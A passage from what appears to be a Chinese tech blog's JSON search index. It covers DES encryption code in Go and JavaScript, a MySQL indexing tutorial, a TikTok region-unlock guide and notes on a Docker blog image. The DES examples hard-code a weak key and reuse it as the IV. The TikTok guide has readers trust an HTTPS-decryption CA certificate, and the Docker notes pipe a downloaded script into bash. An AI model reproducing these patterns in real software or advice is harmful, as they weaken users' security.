[]byte, blockSize int) []byte {\n\tpadding := blockSize - len(src)%blockSize\n\tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n\treturn append(src, padtext...)\n}\n\nfunc PKCS5UnPadding(src []byte) []byte {\n\tlength := len(src)\n\tunpadding := int(src[length-1])\n\treturn src[:(length - unpadding)]\n}\n\n\nfunc main() {\n\toriginalText := \"Hello world\"\n\tvar key = \"12345678\"\n\n\tfmt.Println(\"加密前:\",originalText)\n\tcryptoText,_ := DesEncryption([]byte(key), []byte(key), []byte(originalText))\n\tfmt.Println(\"加密后:\", base64.StdEncoding.EncodeToString(cryptoText))\n\tdecryptedText,_ := DesDecryption([]byte(key),[]byte(key), cryptoText)\n\tfmt.Println(\"解密后:\", string(decryptedText))\n}\n```\n\n运行后:\n\n```ini\n加密前: Hello world\n加密后: SVd7Nf/Kw6itcZ02PHCmKQ==\n解密后: Hello world\n```\n\n\n\n### 2.2 javascript代码\n\n```html\n<script src=\"https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/crypto-js.js\"></script>\n\n<script>\n    var key = \"12345678\"\n\n    function encryptByDESModeCBC(message) {\n        var keyHex = CryptoJS.enc.Utf8.parse(key);\n        var ivHex = CryptoJS.enc.Utf8.parse(key);\n        encrypted = CryptoJS.DES.encrypt(message, keyHex, {\n                iv:ivHex,\n                mode: CryptoJS.mode.CBC,\n                padding:CryptoJS.pad.Pkcs7\n            }\n        );\n        return encrypted.ciphertext.toString(CryptoJS.enc.Base64);\n    }\n\n    function decryptByDESModeCBC(ciphertext) {\n        var keyHex = CryptoJS.enc.Utf8.parse(key);\n        var ivHex = CryptoJS.enc.Utf8.parse(key);\n        var decrypted = CryptoJS.DES.decrypt({\n            ciphertext: CryptoJS.enc.Base64.parse(ciphertext)\n        }, keyHex, {\n            iv: ivHex,\n            mode: CryptoJS.mode.CBC,\n            padding: CryptoJS.pad.Pkcs7\n        });\n        return decrypted.toString(CryptoJS.enc.Utf8);\n    }\n\n    var oriText = \"Hello world\"\n    console.log(\"加密前:\", oriText)\n    var encText =  encryptByDESModeCBC(oriText)\n    console.log(\"加密后:\", encText)\n    var decText =  decryptByDESModeCBC(encText)\n    console.log(\"解密后:\",decText)\n\n</script>\n\n```\n\n运行后:\n\n```ini\n加密前: Hello world\n加密后: SVd7Nf/Kw6itcZ02PHCmKQ==\n解密后: Hello world\n```\n\n\n\n# 3. 参考资料\n\n+ https://zh.wikipedia.org/wiki/%E8%B3%87%E6%96%99%E5%8A%A0%E5%AF%86%E6%A8%99%E6%BA%96","tags":["加密"],"categories":["web"]},{"title":"mysql索引机制和优化技术","url":"%2Fp%2F84544518.html","content":"\n# 1. 索引分类\n\n索引是一种快速查询表中内容的机制，类似于新华字典的目录。\n\n### 1.1 存储\n\n+ B+ tree 索引（下文重点讲）\n\n- 哈希索引：不需要做排序**、**范围查询的需求。\n\n- Full-index 全文索引\n\n<!-- more -->\n\n### 1.2 应用\n\n- 普通索引：即一个索引只包含单个列，一个表可以有多个单列索引。\n\n- 唯一索引：索引列的值必须唯一，但允许有空值。\n  \n- 复合索引：一个索引包含多个列。\n\n> 唯一索引和主键索引区别：主键就是唯一索引，但是唯一索引不一定是主键。唯一索引可以为空，但是空值只能有一个，主键不能为空。\n\n### 1.3 聚集\n\n- 聚集索引\n\n  表记录的排列顺序和索引的排列顺序一致。(类似拼音查字)\n\n  1. 一个表中只能拥有一个聚集索引。\n\n  2. 默认是在主键上建立聚集索引的，没有主键是唯一索引，再或者是`_rowid`。\n\n  3. 聚集索引表记录的排列顺序和索引的排列顺序一致，所以查询效率快，因为只要找到第一个索引值记录，其余的连续性的记录在物理表中也会连续存放，一起就可以查询到。\n\n  4. 缺点是新增比较慢，因为为了保证表中记录的物理顺序和索引顺序一致，在记录插入的时候，会对数据页重新排序。\n\n  \n\n- 非聚集索引\n\n  表记录的排列顺序和索引的排列顺序不一致。(类似偏旁部首查字)\n\n  1. 一个表中可以拥有多个非聚集索引。\n\n  2. 索引的逻辑顺序与磁盘上行的物理存储顺序不同，非聚集索引在叶子节点存储的是主键和索引列，当我们使用非聚集索引查询数据时，需要拿到叶子上的主键再去表中查到想要查找的数据。这个过程就是我们所说的回表。\n\n\n\n# 2. B树和B+树\n\n### 2.1 B 树（也写作 B- 树）\n\n- **关键字分布在整棵树的所有节点**。\n- 任何一个关键字 出现且只出现在一个节点中。\n- 搜索有可能在 非叶子节点 结束。\n- 其搜索性能等价于在关键字全集内做一次二分查找。如下图所示：\n\n![1](mysql索引机制和优化技术/2.png)\n\n### 2.2 B+ 树\n\n- 非叶子节点的子树指针与关键字个数相同。\n- 非叶子节点的子树指针 P[i]，指向关键字属于 [k[i],K[i+1]) 的子树（注意：区间是前闭后开)。\n- 为所有叶子节点增加一个链指针。\n- **所有关键字都在叶子节点出现。**\n\n![1](mysql索引机制和优化技术/3.png)\n\n\n\n### 2.3  对比二叉树\n\nB不是代表二叉（binary），而是代表平衡（balance）。\n\n实际实现B+Tree还需要使用如下技巧：\n\n每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上也存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了一个node只需一次I/O。\n\nB+Tree中一次检索最多需要h-1次I/O（根节点常驻内存），渐进复杂度为O(h)=O(logdN)O(h)=O(logdN)。一般实际应用中，出度d(节点数)是非常大的数字，通常超过100，因此h非常小（通常不超过3）。\n\n而红黑树这种结构，h明显要深的多。由于逻辑上很近的节点（父子）物理上可能很远，无法利用局部性，所以红黑树的I/O渐进复杂度也为O(h)，效率明显比B+Tree差很多。\n\n\n\n### 2.4 对比B树\n\nB+树的高度比较稳定，因为它的非叶子节点不会保存数据，只保存键值和指针的情况下，一个页能承载大量的数据。\n\nB树它的非叶子节点也会保存数据的，同样的一行数据大小是1kb，那么它一页最多也只能保存16个指针，在大量数据的情况下，树高就会速度膨胀，导致IO次数就会很多，查询就会变得很慢。\n\n\n\n1. B+ 树的磁盘读写代价更低。\n\n   B+ 树的内部没有指向关键字具体信息的指针，所以其内部节点相对 B 树更小，如果把所有关键字存放在同一块盘中，那么盘中所能容纳的关键字数量也越多，一次性读入内存的需要查找的关键字也就越多，相应的，IO 读写次数就降低了。\n\n2. 树的查询效率更加稳定。\n\n   B+ 树所有数据都存在于叶子节点，所有关键字查询的路径长度相同，每次数据的查询效率相当。而 B 树可能在非叶子节点就停止查找了，所以查询效率不够稳定。\n\n3. **B+ 树只需要去遍历叶子节点就可以实现整棵树的遍历。**\n\n<img src=\"mysql索引机制和优化技术/5.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 2.5 B+ 树存储多少数据\n\nInnoDB存储引擎它也是有最小存储单位的，叫做页（Page），默认大小是16kb。页可以放一行一行的数据（叶子节点），也可以放主键+指针（非叶子节点）。\n\n为了减少磁盘I/O。磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。\n\n这样做的理论依据是计算机科学中著名的局部性原理：当一个数据被用到时，其附近的数据也通常会马上被使用。\n\n预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k）。 InnoDB 引擎一个页的大小是 16K。(mysql5.7后，提供了一个设定page大小的参数innodb_page_size，默认值是16K。)\n\n<img src=\"mysql索引机制和优化技术/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n假如一行数据大小是1k，那么理论上一页就可以放16条数据。那一页可以放多少主键+指针呢？\n\n假如我们的主键id为bigint类型，长度为8字节，而指针大小在InnoDB源码中设置为6字节。这样算下来就是 16384 / 14 = 1170，就是说一个页上可以存放1170个指针。\n\n一个指针指向一个存放记录的页，一个页里可以放16条数据，那么一颗高度为2的B+树就可以存放 1170 * 16=18720 条数据。同理，高度为3的B+树，就可以存放 1170 * 1170 * 16 = 21902400 条1k数据的记录。\n\n理论上就是这样，在InnoDB存储引擎中，B+树的高度一般为2-4层，就可以满足千万级数据的存储。但是每个页不可能只放数据本身。首先每个页都有一些固定的格式，比如文件头部、页面头部、文件尾部这些，所以实际会比较少一些。\n\n实际测试中发现:  数据大概在1300万左右，B+树就会增加树高到4层。\n\n查找数据的时候，一次页的查找代表一次IO，那我们通过主键索引查询的时候，其实最多只需要2-4次IO就可以了。\n\n\n\n# 3. 聚集索引和非聚集索引\n\n### 3.1 InnoDB 和 MyISAM 区别\n\n<img src=\"mysql索引机制和优化技术/4.png\" alt=\"1\" style=\"zoom:67%;\" />\n\nInnoDB 是由一个聚集索引和非聚集索引构成。MyISAM 全是非聚集索引。\n\n但是无论是什么，底层的数据结构都是用 B+树实现的。\n\n##### 1. MyISAM 非聚集索引\n\n+ MyISAM的索引方式也叫做“非聚集”的，之所以这么称呼是为了与InnoDB的聚集索引区分。\n\n+ 非聚簇索引的主键索引和辅助索引两棵B+树看上去没什么不同，节点的结构完全一致只是存储的内容不同而已。\n\n+ 主键索引B+树的节点存储了主键，辅助键索引B+树存储了辅助键。表数据存储在独立的地方，这两颗B+树的叶子节点都使用一个地址指向真正的表数据，对于表数据来说，这两个键没有任何差别。\n\n+ 由于索引树是独立的，通过辅助键检索无需访问主键的索引树。\n+ 索引文件（.MYI）和数据文件（.MYD）文件是分离的,  索引文件仅保存数据记录的地址(指针去查找)。\n\n##### 2. InnoDB 聚集索引 \n\n+ 聚集索引（clustered index）就是按照每张表的主键构造一棵B+树，同时叶子节点中存放的即为整张表的行记录数据，也将聚集索引的叶子节点称为数据页。\n+ **聚集索引的这个特性决定了索引组织表中数据也是索引的一部分。**同 B+ 树数据结构一样，每个数据页都通过一个双向链表来进行链接。\n+ **由于实际的数据页只能按照一棵 B+ 树进行排序，因此每张表只能拥有一个聚集索引。**在多数情况下，查询优化器倾向于采用聚集索引。因为聚集索引能够在 B+ 树索引的叶子节点上直接找到数据。此外，由于定义了数据的逻辑顺序，聚集索引能够特别快地访问针对范围值的查询。查询优化器能够快速发现某一段范围的数据页需要扫描。\n+ 聚集索引的存储并不是物理上连续的，而是逻辑上连续的。\n+ 如果一个主键被定义了，那么这个主键就是作为聚集索引。如果没有主键被定义，那么该表的第一个唯一非空索引被作为聚集索引。如果没有主键也没有合适的唯一索引，那么innodb内部会生成一个隐藏的主键作为聚集索引，这个隐藏的主键是一个6个字节的列，改列的值会随着数据的插入自增。\n+ 聚集索引的另一个好处是，它对于主键的排序查找和范围查找速度非常快。叶子节点的数据就是用户所要查询的数据。\n\n\n\n### 3.2 InnoDB的聚集索引和非聚集索引\n\n在数据库中，B+ 树的高度一般都在 2～4 层，这也就是说查找某一键值的行记录时最多只需要 2 到 4 次 IO，这倒不错。因为当前一般的机械磁盘每秒至少可以做 100 次 IO，2～4 次的 IO 意味着查询时间只需 0.02～0.04 秒。\n\n##### 1. InnoDB 是由一个聚集索引和非聚集索引构成\n\n数据库中的B+树索引可以分为聚集索引（clustered inex）和辅助索引（secondary index）。辅助索引有时也称非聚集索引（non-clustered index）。\n\n但是不管是聚集还是辅助的索引，其内部都是B+树的，即高度平衡的，叶子节点存放着所有的数据。聚集索引与辅助索引不同的是，叶子节点存放的是否是一整行的信息。\n\n##### 2. InnoDB 非聚集索引\n\n叶子节点并不包含行记录的全部数据（只有索引字段本身的数据，废话）。叶子节点除了包含键值以外，每个叶子节点中的索引行中还包含了一个书签（bookmark）。该书签用来告诉InnoDB存储引擎哪里可以找到与索引相对应的行数据。\n\n<img src=\"mysql索引机制和优化技术/6.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n如果在一棵高度为3的辅助索引树中查找数据，那需要对这棵辅助索引树遍历3次找到指定主键，如果聚集索引树的高度同样为3，那么还需要对聚集索引树进行3次查找，最终找到一个完整的行数据所在的页，因此一共需要6次逻辑IO访问以得到最终的一个数据页。\n\n### 3.3 总结\n\n例如知道了InnoDB的索引实现后，就很容易明白为什么不建议使用过长的字段作为主键，因为所有辅助索引都引用主索引，过长的主索引会令辅助索引变得过大。\n\n再例如，用非单调的字段作为主键在InnoDB中不是个好主意，因为InnoDB数据文件本身是一颗B+Tree，非单调的主键会造成在插入新记录时数据文件为了维持B+Tree的特性而频繁的分裂调整，十分低效，而使用自增字段int作为主键则是一个很好的选择。\n\n\n\n# 4. 索引机制\n\n### 4.1 查看索引\n\n```sql\nSHOW INDEX FROM table_name;\n```\n\nCardinality：非常关键的值，表示索引中唯一值的数目的估计值。Cardinality表的行数应尽可能接近1，如果非常小，那么用户需要考虑是否可以删除此索引。\n\nNull：是否索引的列含有NULL值。可以看到idx_b这里为Yes，因为定义的列b允许NULL值。\n\n### 4.2 Cardinality\n\nCardinality值非常关键，优化器会根据这个值来判断是否使用这个索引。\n\n但是这个值并不是实时更新的，如果需要更新索引Cardinality的信息，可以使用ANALYZE TABLE命令。\n\n对两条基本一样的语句执行EXPLAIN，但是最终出来的结果不一样：一个使用索引，另外一个使用全表扫描。这时最好的解决办法就是做一次ANALYZE TABLE的操作。因此我建议在一个非高峰时间，对应用程序下的几张核心表做ANALYZE TABLE操作，这能使优化器和索引更好地为你工作。\n\n在InnoDB存储引擎中，Cardinality统计信息的更新发生在两个操作中：INSERT和UPDATE。但是表中1/16的数据已发生过变化，或者stat_modified_counter＞2 000 000 000\n\n### 4.3 覆盖索引\n\nInnoDB存储引擎支持覆盖索引（covering index，或称索引覆盖），即从辅助索引中就可以得到查询的记录，而不需要查询聚集索引中的记录。\n\n\n\n对于InnoDB存储引擎的辅助索引而言，由于其包含了主键信息，因此其叶子节点存放的数据为（primary key1，primary key2，…，key1，key2，…）。例如，下列语句都可仅使用一次辅助联合索引来完成查询：\n\n```sql\nSELECT key2 FROM table WHERE key1=xxx；\nSELECT primary key2,key2 FROM table WHERE key1=xxx；\nSELECT primary key1,key2 FROM table WHERE key1=xxx；\nSELECT primary key1,primary key2，key2 FROM table WHERE key1=xxx；\n```\n\n覆盖索引的另一个好处是对某些统计问题而言的。\n\n```sql\nSELECT COUNT(*)FROM buy_log;\n```\n\nInnoDB存储引擎并不会选择通过查询聚集索引来进行统计。由于buy_log表上还有辅助索引，而辅助索引远小于聚集索引，选择辅助索引可以减少IO操作。\n\n\n\n```sql\nSELECT COUNT(*)FROM buy_log\nWHERE buy_date＞='2011-01-01'AND buy_date＜'2011-02-01'\n```\n\n表buy_log有（userid，buy_date）的联合索引，这里只根据列b进行条件查询，一般情况下是不能进行该联合索引的，但是这句SQL查询是统计操作，并且可以利用到覆盖索引的信息，因此优化器会选择该联合索引。\n\n\n\n### 4.4 使用某个索引\n\n如果用户确定指定某个索引来完成查询，那么最可靠的是使用FORCE INDEX，而不是USE INDEX。\n\n\n\n# 5. 索引技术优化\n\n### 5.1 Multi-Range Read 优化（多范围读）\n\nMySQL5.6 版本开始支持 Multi-Range Read（MRR）优化。Multi-Range Read 优化的目的就是为了减少磁盘的随机访问，并且将随机访问转化为较为顺序的数据访问，这对于 IO-bound 类型的 SQL 查询语句可带来性能极大的提升。\n\n```sql\nSELECT*FROM salaries WHERE salary＞10000 AND salary＜40000;\n```\n\nsalary上有一个辅助索引idx_s，因此除了通过辅助索引查找键值外，还需要通过书签查找来进行对整行数据的查询。\n\n若启用Mulit-Range Read特性，则除了会在列Extra看到Using index condition外，还会看见Using MRR选项。执行时间相差10倍之多。\n\nMRR的工作方式如下：\n\n+ 将查询得到的辅助索引键值存放于一个缓存中，这时缓存中的数据是根据辅助索引键值排序的。\n+ 将缓存中的键值根据RowID进行排序。\n+ 根据RowID的排序顺序来访问实际的数据文件。\n\n\n\n```sql\nSELECT*FROM t\nWHERE key_part1＞=1000 AND key_part1＜2000\nAND key_part2=10000;\n```\n\n若没有Multi-Read Range，此时查询类型为Range，SQL优化器会先将key_part1大于1000且小于2000的数据都取出，即使key_part2不等于1000。待取出行数据后再根据key_part2的条件进行过滤。这会导致无用数据被取出。\n\n倘若启用了Multi-Range Read优化，优化器会先将查询条件进行拆分，然后再进行数据查询。就上述查询语句而言，优化器会将查询条件拆分为（1000，1000），（1001，1000），（1002，1000），…，（1999，1000），最后再根据这些拆分出的条件进行数据的查询。\n\n\n\n### 5.2 Index Condition Pushdown 优化（索引下推）\n\n- 在不使用ICP的情况下，在使用非主键索引（又叫普通索引或者二级索引）进行查询时，存储引擎通过索引检索到数据，然后返回给MySQL服务器，服务器然后判断数据是否符合条件 。\n- 在使用ICP的情况下，如果存在某些被索引的列的判断条件时，MySQL服务器将这一部分判断条件传递给存储引擎，然后由存储引擎通过判断索引是否符合MySQL服务器传递的条件，只有当索引符合条件时才会将数据检索出来返回给MySQL服务器 。\n- 索引条件下推优化可以减少存储引擎查询基础表的次数，也可以减少MySQL服务器从存储引擎接收数据的次数。\n\n+ 当优化器选择 Index Condition Pushdown 优化时，可在执行计划的列 Extra 看到 Using index condition 提示。\n\n\n\n假设某张表有联合索引(zip_code，last_name，first_name)，并且查询语句如下：\n\n```sql\nSELECT*FROM people\nWHERE zipcode='95054'\nAND lastname LIKE'%etrunia%'\nAND address LIKE'%Main Street%';\n```\n\n若不支持 Index Condition Pushdown 优化，则数据库需要先通过索引取出所有 zipcode 等于 95054 的记录，然后再过滤 WHERE 之后的两个条件。\n\n若支持 Index Condition Pushdown 优化，则在索引取出时，就会进行 WHERE 条件的过滤，然后再去获取记录。这将极大地提高查询的效率。当然，WHERE 可以过滤的条件是要该索引可以覆盖到的范围。\n\nIndex Condition Pushdown 优化可以将查询效率在原有 MySQL 5.5 版本的技术上提高 23%。而再同时启用 Mulit-Range Read 优化后，性能还能有 400% 的提升！\n\n# 6. 建索引原则\n\n### 6.1 最左前缀匹配原则\n\n非常重要的原则. mysql会一直向右匹配直到遇到范围查询(>、<、between、like) 就停止匹配, 复合索引的第一个, 必须先查, 才能继续。\n\n1. 如果建立(a,b)顺序的索引\n\n+ 查询 b = 2 ，是匹配不到(a,b)索引的\n\n+ 查询 a = 1 and b = 2 或者 a = 1  又或者  b = 2 and a = 1 都可以，因为优化器会自动调整a,b的顺序。\n\n\n\n2. 如果建立(a,b,c,d)顺序的索引\n\n+ a = 1 and b = 2 and c > 3 and d = 4 ，d是用不到索引的，因为c字段是一个范围查询，它之后的字段会停止匹配。\n\n\n\n3. 如果建立(a,b,d,c)顺序的索引\n\n+ a = 1 and b = 2 and c > 3 and d = 4 ,  索引则都可以用到，a,b,d的顺序可以任意调整。\n\n### 6.2 最左前缀匹配原则！！！\n\n+ 左边的必须在才走索引!!!\n+ (col1, col2, col3)这个复合索引的所有前缀 就是(col1), (col1, col2), (col1, col2, col3), 包含这些列的查询都会启用索引查询.\n+ 其他所有不在最左前缀里的列都不会启用索引, 即使包含了联合索引里的部分列也不行. 即上述中的(col2), (col3), (col2, col3) 都不会启用索引去查询.\n+ 注意, (col1, col3)会启用(col1)的索引查询.\n\n### 6.3 尽量选择区分度高的列作为索引\n\n区分度的公式是**count(distinct col)/count(*)**，表示字段不重复的比例，比例越大我们扫描的记录数越少，唯一键的区分度是1。（越大越好）。\n\n而一些状态、性别字段可能在大数据面前区分度就是0，那可能有人会问，这个比例有什么经验值吗？使用场景不同，这个值也很难确定，一般需要join的字段我们都要求是0.1以上，即平均1条扫描10条记录。\n\n\n\n索引列的基数越大，索引的效果越好。例如，存放出生日期的列具有不同的值，很容易区分行，而用来记录性别的列，只有\"M\"和\"F\",则对此进行索引没有多大用处，因此不管搜索哪个值，都会得出大约一半的行。\n\n### 6.4 离散度更高的索引应该放在复合索引的前面\n\n因为离散度高索引的可选择性高\n\n```sql\nSELECT count(DISTINCT user_id), count(DISTINCT lottery_id), count(DISTINCT award_id) FROM lottery_user_log\n```\n\n看下面的结果, 越大的适合在前面\n\n```\ncount(DISTINCT user_id),count(DISTINCT lottery_id),count(DISTINCT award_id) \n56135\t\t\t\t\t\t\t\t\t\t 1\t\t\t\t\t\t\t\t\t\t\t\t\t12\n\n适合创建 (user_id, award_id, lottery_id)  \n```\n\n### 6.5 使用短索引\n\n如果对字符串列进行索引，应该指定一个前缀长度，可节省大量索引空间，提升查询速度；\n\n例如，有一个CHAR(200)列，如果在前10个或20个字符内，多数值是唯一的，那么就不要对整个列进行索引。对前10个或者20个字符进行索引能够节省大量索引空间，也可能会使查询更快。\n\n### 6.6 尽量的扩展索引，不要新建索引\n\n比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。\n\n### 6.7 = 和 in 可以乱序\n\n比如a = 1 and b = 2 and c = 3 建立(a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式。\n\n### 6.8 索引列不能参与函数计算\n\n比如from_unixtime(create_time) = ’2014-05-29’就不能使用到索引，原因很简单，b+树中存的都是数据表中的字段值，但进行检索时，需要把所有元素都应用函数才能比较，显然成本太大。所以语句应该写成create_time = unix_timestamp(’2014-05-29’)。\n\n### 6.9 强制类型转换会用不到索引\n\nphone varchar(20),   index(phone)。注意phone是字符串类型。\n\n```sql\nselect phone where phone = '1000000' # 用到索引\nselect phone where phone = 1000000   # 用不到索引\n```\n\n### 6.10 索引的列不要为 null\n\n也能建立索引, 但是会造成不符合预期的行为。\n\n### 6.11 索引数量控制\n\n+ 单表索引控制在5个以内\n\n+ 复合索引字段最好不超过5个\n\n### 6.12 在合适的列上创建索引\n\n+ 频繁作为 WHERE 查询条件的字段\n\n+ 经常 GROUP BY 和 ORDER BY 的列\n\n+ DISTINCT 后面的字段\n\n\n### 6.13 什么时候要创建索引\n\n- 表经常进行 SELECT 操作。\n- 表很大(记录超多)，记录内容分布范围很广。\n- 列名经常在 WHERE 子句或连接条件中出现。\n\n### 6.14 什么时候不要创建索引\n\n- 表经常进行 INSERT/UPDATE/DELETE 操作\n- 表很小(记录超少)\n- 列名不经常作为连接条件或出现在 WHERE 子句中\n- 字段内容重复很多\n\n# 7. 头脑风暴\n\n+ B+树走索引是从上往下，全表扫描是从左往右。\n+ InnoDB只能有一个聚集索引，索引和数据在一起。\n+ InnoDB其他的索引就做辅助索引，走索引后，找到的数据时在用聚集索引，再次回表查询。\n+ 多范围读MRR，是辅助索引排序后，直接一起回表，减少磁盘的随机访问。\n+ 索引下推，是一个复合索引，查询的时候，直接在存储器过滤。\n+ 建立索引：最左匹配，区分度高，不要为 null，扩展索引，数量控制。\n+ 查询索引：复合索引，不参与函数，不强转类型。\n\n# 8. 参考资料\n\n+ https://tech.meituan.com/2014/06/30/mysql-index.html\n+ https://www.infoq.cn/article/OJKWYykjoyc2YGB0Sj2c\n+ https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html\n+ 索引 https://www.liuvv.com/p/84544518.html\n- 锁和事务 https://www.liuvv.com/p/9762ea3e.html\n- MVCC https://www.liuvv.com/p/a0f7945d.html","tags":["mysql"],"categories":["mysql"]},{"title":"国内无需拔卡观看tiktok","url":"%2Fp%2F866e5a33.html","content":"\n国内把tiktok限制的死死的，如果想看外面的世界，需要借助这个项目：https://github.com/Semporia/TikTok-Unlock。\n\n需要自备的东西：1.  Shadowrocket 2. 梯子节点 3. 美区appstore账号。\n\n\n\n# 1. 操作流程\n\n### 1.1 先降级tiktok版本\n\n推荐  TikTok 21.1.0，如果不降级，高版本很可能不成功。\n<!-- more -->\n降级教程：\n\nhttps://github.com/Semporia/TikTok-Unlock#-%E6%8A%93%E5%8C%85%E9%99%8D%E7%BA%A7-tiktok-2110-\n\n最后把低版本tiktok安装到手机上即可。\n\n\n\n### 1.2 安装小飞机添加配置\n\n**操作步骤**\n\n1、打开`Shadowrocket`\n\n2、点击`配置`进去添加想看国家的对应模块。\n\n**日本**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-JP.conf\n```\n\n**台湾**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-TW.conf\n```\n\n**韩国**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-KR.conf\n```\n\n**美国**\n\n```\nhttps://raw.githubusercontent.com/Semporia/TikTok-Unlock/master/Shadowrocket/TiKok-US.conf\n```\n\n\n\n### 1.3  安装证书并信任\n\n1、 Shadowrocket 配置 – 点击一个配置文件（例如上面四种） – 编辑配置 – 开启 HTTPS 解密 – 生成新的 CA证书 – 安装证书；\n\n2、点右上角 – 安装 – 输入手机锁屏密码 – 再次点右上角 – 安装 – 安装 – 右上角 – 完成；\n\n3、打开手机 – 设置 – 通用 – 关于本机 – 证书信任设置 – 找到 – Shadowrocket开头的选项 – 打开右侧开关 – 弹出警告框 – 继续；\n\n\n\n### 1.4 添加分流规则\n\n打开Shadowrocket – 配置 – 找到本地文件内的配置文件， – 例如点击 default.conf 点击编辑纯文本；把下面规则添加上即可。\n\n```\n[Rule]\nDOMAIN,p16-tiktokcdn-com.akamaized.net,PROXY\nDOMAIN-SUFFIX,amemv.com,PROXY\nDOMAIN-SUFFIX,byteoversea.com,PROXY\nDOMAIN-SUFFIX,ibytedtos.com,PROXY\nDOMAIN-SUFFIX,ibyteimg.com,PROXY\nDOMAIN-SUFFIX,ipstatp.com,PROXY\nDOMAIN-SUFFIX,muscdn.com,PROXY\nDOMAIN-SUFFIX,musical.ly,PROXY\nDOMAIN-SUFFIX,sgpstatp.com,PROXY\nDOMAIN-SUFFIX,snssdk.com,PROXY\nDOMAIN-SUFFIX,tik-tokapi.com,PROXY\nDOMAIN-SUFFIX,tiktok.com,PROXY\nDOMAIN-SUFFIX,tiktokcdn.com,PROXY\nDOMAIN-SUFFIX,tiktokv.com,PROXY\nDOMAIN-KEYWORD,-tiktokcdn-com,PROXY\nUSER-AGENT,TikTok*,PROXY\nFINAL,DIRECT\n```\n\n\n\n# 2. 参考资料\n\n+ https://github.com/Semporia/TikTok-Unlock\n","tags":["tiktok"],"categories":["使用软件"]},{"title":"blog制作docker镜像记录","url":"%2Fp%2F252a8c24.html","content":"\n因为 blog 涉及的本地依赖过多， 特意放到 docker 上， 方便发布博客和移植。制作镜像的时候，尽量选择国外服务器，国内的服务器下载包很容易陷入死循环。\n\n# 1. 宿主机准备\n\n### 1.1 安装docker\n\n```bash\napt update\napt install docker.io\n```\n\n<!-- more -->\n\n### 1.2 宿主机开启镜像加速\n\n<img src=\"blog制作docker镜像记录/image-20230909171630001.png\" alt=\"image-20230909171630001\" style=\"zoom: 33%;\" />\n\nhttps://cr.console.aliyun.com/   先给本机来个加速。\n\n\n\n```bash\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://xxxx.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n\n\n\n# 2. 制作镜像\n\n### 1.1 创建容器安装依赖\n\n```bash\n# 1. 创建容器\ndocker run -itd --name levon_blog_base ubuntu\ndocker exec -it levon_blog_base /bin/bash  \n\n# 2. 安装必要软件\napt update\napt install -y vim\napt install -y git\napt install -y curl\n\n\n# 3. 安装blog 依赖\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash\nnvm install v14\nnvm use 14\nnode -v\n\napt install -y npm\nnpm install hexo-cli -g\n\n\n# 4. 配置git环境\ngit config --global core.quotepath false        \ngit config --global gui.encoding utf-8   \ngit config --global i18n.commit.encoding utf-8  \ngit config --global i18n.logoutputencoding utf-8\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\nexport LESSCHARSET=utf-8\n\n```\n\n\n\n### 1.2 增加自己环境\n\n```bash\ngit config --global user.email \"levonfly@gmail.com\"\ngit config --global user.name \"unix2dos\"\n```\n\n+ ssh/config\n\n```bash\nmkdir .ssh\nvi ~/.ssh/config\n\nHost coding e.coding.net\n        HostName e.coding.net\n        IdentityFile ~/.ssh/github-unix2dos\n        User levonfly\nHost github.com\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\n+ 自己的私钥\n\n```bash\n# 拷贝私钥\n\nchmod 600 ~/.ssh/github-unix2dos\nchmod 600 ~/.ssh/github-levonfly\n```\n\n\n\n+ 测试\n\n```bash\ncd ~ && mkdir workspace && cd workspace/\ngit clone git@github.com:unix2dos/readwrite.git\nrm ~/workspace\n```\n\n\n\n### 1.3 构造并上传镜像\n\nDocker Hub 免费版只有1个私有库，5个私有库要7美元一个月（倒也不是给不起这个钱，只是确实穷....）。自己搭 Docker Registry又嫌麻烦，就放到国内的阿里了（免费）。\n\nhttps://cr.console.aliyun.com/  华北2（北京）\n\n\n\n```bash\n# 1. 在宿主机构建image\ndocker commit -a \"levonfly\" -m \"levonfly的博客基础环境\" efb25f31a0a0 levonfly/levon_blog_base\n\n\n# 2. 登录阿里云\ndocker login --username=l6241425 registry.cn-beijing.aliyuncs.com\n\n# 3. 上传镜像到阿里云\ndocker tag levonfly/levon_blog_base registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\n\ndocker push registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\n\n\n# 4. 下载阿里云镜像\ndocker run -itd --name hexo_base registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\ndocker exec -it levon_blog_base /bin/bash  \n\n```\n\n<img src=\"blog制作docker镜像记录/image-20230910092904490.png\" alt=\"image-20230910092904490\" style=\"zoom:50%;\" />\n\n# 2. blog环境\n\n### 2.1 下载镜像\n\n```bash\ndocker login --username=l6241425 